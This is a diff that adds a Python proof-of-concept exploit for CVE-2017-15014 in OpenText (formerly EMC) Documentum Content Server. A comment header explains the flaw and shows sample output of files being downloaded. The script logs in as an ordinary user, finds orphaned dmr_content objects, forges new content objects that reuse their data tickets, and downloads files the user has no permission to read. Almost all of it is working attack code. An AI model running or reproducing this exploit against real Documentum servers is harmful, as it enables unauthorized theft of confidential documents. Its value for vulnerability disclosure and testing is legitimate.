@@ -1,0 +1,154 @@
+#!/usr/bin/env python
+
+# Opentext Documentum Content Server (formerly known as EMC Documentum Content Server)
+# contains following design gap, which allows authenticated user to download arbitrary
+# content files regardless attacker's repository permissions:
+#
+# when authenticated user upload content to repository he performs following steps:
+# - calls START_PUSH RPC-command
+# - uploads file to content server
+# - calls END_PUSH_V2 RPC-command, here Content Server returns DATA_TICKET,
+#    purposed to identify the location of the uploaded file on Content Server filesystem
+# - further user creates dmr_content object in repository, which has value of data_ticket equal
+#    to the value of DATA_TICKET returned at the end of END_PUSH_V2 call
+#
+# As the result of such design any authenticated user may create his own dmr_content object,
+# pointing to already existing content of Content Server filesystem
+#
+# The PoC below demonstrates this vulnerability:
+#
+# MacBook-Pro:~ $ python CVE-2017-15014.py
+# usage:
+# CVE-2017-15014.py host port user password
+# MacBook-Pro:~ $ python CVE-2017-15014.py docu72dev01 10001 dm_bof_registry dm_bof_registry
+# Trying to connect to docu72dev01:10001 as dm_bof_registry ...
+# Connected to docu72dev01:10001, docbase: DCTM_DEV, version: 7.2.0270.0377  Linux64.Oracle
+# Trying to find any object with content...
+# Querying "inaccessible" dmr_content objects...
+# Downloaded 3959/3959 bytes of object 06024be980000133
+# Downloaded 11280/11280 bytes of object 06024be980000135
+# Downloaded 10004/10004 bytes of object 06024be980000138
+# Downloaded 23692/23692 bytes of object 06024be98000017a
+# Downloaded 19541/19541 bytes of object 06024be980000180
+# Downloaded 1096/1096 bytes of object 06024be980000172
+# Downloaded 11776/11776 bytes of object 06024be98000011f
+# Downloaded 50176/50176 bytes of object 06024be980000125
+# Downloaded 16384/16384 bytes of object 06024be98000012f
+# Downloaded 985/985 bytes of object 06024be9800001f5
+# Downloaded 191/191 bytes of object 06024be9800001fe
+# Downloaded 213/213 bytes of object 06024be980000200
+#
+
+
+
+import socket
+import sys
+
+from dctmpy import NULL_ID
+
+from dctmpy.docbaseclient import DocbaseClient
+from dctmpy.obj.typedobject import TypedObject
+
+CIPHERS = "ALL:aNULL:!eNULL"
+
+
+def usage():
+    print "usage:\n%s host port user password" % sys.argv[0]
+
+
+def main():
+    if len(sys.argv) != 5:
+        usage()
+        exit(1)
+
+    (session, docbase) = create_session(*sys.argv[1:5])
+
+    if is_super_user(session):
+        print "Current user is a superuser, nothing to do"
+        exit(1)
+
+    print "Trying to find any object with content..."
+    object_id = session.query(
+        "SELECT FOR READ r_object_id "
+        "FROM dm_sysobject WHERE r_content_size>0") \
+        .next_record()['r_object_id']
+    session.apply(None, NULL_ID, "BEGIN_TRANS")
+    print "Querying \"inaccessible\" dmr_content objects..."
+    for e in session.query(
+            "SELECT * FROM dmr_content "
+            "WHERE ANY parent_id IS NOT NULLID "
+            "AND ANY parent_id NOT IN "
+            "(SELECT r_object_id FROM dm_sysobject)"
+    ):
+        handle = 0
+        try:
+            content_id = session.next_id(0x06)
+            obj = TypedObject(session=session)
+            obj.set_string("OBJECT_TYPE", "dmr_content")
+            obj.set_bool("IS_NEW_OBJECT", True)
+            obj.set_int("i_vstamp", 0)
+            obj.set_id("storage_id", e["storage_id"])
+            obj.set_id("format", e["format"])
+            obj.set_int("data_ticket", e["data_ticket"])
+            obj.set_id("parent_id", object_id)
+            if not session.save_cont_attrs(content_id, obj):
+                print "Failed"
+                exit(1)
+
+            handle = session.make_puller(
+                NULL_ID, obj["storage_id"], content_id,
+                obj["format"], obj["data_ticket"]
+            )
+            if handle == 0:
+                raise RuntimeError("Unable make puller")
+            size = 0
+            for chunk in session.download(handle):
+                size += len(chunk)
+
+            print "Downloaded %d/%d bytes of object %s" % \
+                  (size, e['full_content_size'], e['r_object_id'])
+        finally:
+            if handle > 0:
+                try:
+                    session.kill_puller(handle)
+                except:
+                    pass
+
+
+def create_session(host, port, user, pwd):
+    print "Trying to connect to %s:%s as %s ..." % (host, port, user)
+    session = None
+    try:
+        session = DocbaseClient(
+            host=host, port=int(port),
+            username=user, password=pwd)
+    except socket.error, e:
+        if e.errno == 54:
+            session = DocbaseClient(
+                host=host, port=int(port),
+                username=user, password=pwd,
+                secure=True, ciphers=CIPHERS)
+        else:
+            raise e
+    docbase = session.docbaseconfig['object_name']
+    version = session.serverconfig['r_server_version']
+    print "Connected to %s:%s, docbase: %s, version: %s" % \
+          (host, port, docbase, version)
+    return (session, docbase)
+
+
+def is_super_user(session):
+    user = session.get_by_qualification("dm_user WHERE user_name=USER")
+    if user['user_privileges'] == 16:
+        return True
+    group = session.get_by_qualification(
+        "dm_group where group_name='dm_superusers' "
+        "AND any i_all_users_names=USER")
+    if group is not None:
+        return True
+
+    return False
+
+
+if __name__ == '__main__':
+    main()
